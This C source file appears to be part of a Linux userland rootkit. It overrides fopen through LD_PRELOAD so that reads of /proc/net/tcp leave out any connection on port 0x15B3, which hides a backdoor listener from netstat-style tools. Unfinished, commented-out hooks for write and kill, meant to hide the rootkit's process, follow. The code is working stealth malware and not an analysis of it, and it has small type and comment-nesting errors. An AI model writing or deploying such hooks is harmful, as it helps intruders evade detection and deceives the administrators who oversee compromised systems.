#include <stdio.h>
#include <dlfcn.h>
#include <unistd.h>
#include <string.h>

#define KEY_PORT "15B3"

FILE *(*orig_fopen)(const char *pathname,const char mode);
FILE *fopen(const char *pathname, const char *mode){

    orig_fopen=dlsym(RTLD_NEXT,"fopen");

    char *ptr_tcp = strstr(pathname, "/proc/net/tcp");

    FILE *fp;

    if (ptr_tcp!=NULL){
        char line[256];
        FILE *temp = tmpfile();
        fp =orig_fopen(pathname,mode);
        while(fgets(line,sizeof(line),fp)){
            char *listener = strstr(line,KEY_PORT);
            if(listener!=NULL){
                continue;
            }
            else{
                fputs(line,temp);
            }
        }
        return temp;
    }
    fp=orig_fopen(pathname,mode);
    return fp;
}



/*ssize_t write(int fd, const void *buf, size_t count){
	ssize_t (*new_write) (int fd, const void *buf, size_t count);

	ssize_t result;

/* get pid of rootkit
 use that to match against the write*/

/*
	new_write=dlsym(RTLD_NEXT, "write");
	if(strcmp(buf, "pid")){
		result = NULL;
	}
	else{
		result = new_write(fd,buf,count);
	}
	return result;
}
*/

/*int kill(pid_t pid, int sig){
	int (*new_kill) (pid_t pid, int sig);

	long result;

	new_kill=dlsym(RTLD_NEXT,"kill");
}
*/
